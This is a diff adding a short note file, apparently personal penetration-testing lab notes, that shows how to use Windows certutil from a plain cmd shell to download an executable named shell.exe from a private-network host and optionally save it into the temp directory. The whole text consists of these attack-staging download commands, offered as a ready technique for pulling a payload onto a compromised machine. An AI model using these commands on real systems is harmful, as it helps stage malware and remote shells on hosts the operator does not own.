@@ -1,0 +1,9 @@
+if only cmd is available:
+
+certutil -urlcache -split -f http://192.168.119.180/shell.exe
+
+to output to another directory(this example will output to the temp dir):
+
+certutil -urlcache -split -f http://192.168.119.117/shell.exe %tmp%\shell.exe
+  - from here you can just cd into temp by using:
+    - cd %tmp%
